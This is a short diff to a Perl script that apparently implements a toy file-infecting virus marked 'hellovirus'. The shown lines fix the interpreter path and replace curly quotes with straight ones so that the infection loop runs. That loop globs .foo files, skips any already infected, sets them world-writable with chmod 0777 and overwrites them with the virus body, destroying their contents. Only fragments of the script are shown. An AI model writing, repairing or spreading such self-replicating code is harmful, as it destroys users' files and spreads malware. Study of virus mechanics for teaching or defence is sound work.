@@ -1,4 +1,4 @@
-#!/bin/env perl
+#!/usr/bin/perl
 
 use Cwd;
 chdir cwd;
@@ -30,7 +30,7 @@ foreach my $file ( glob "*.foo" ) {
 	open IN, "< $file";
 	my @all_of_it = <IN>;
 	close IN;
-	next if (join ’ ’, @all_of_it) =~ /hellovirus/m;
+	next if (join ' ', @all_of_it) =~ /hellovirus/m;
 	chmod 0777, $file;
 	open OUT, "> $file";
 	print OUT "$virus";
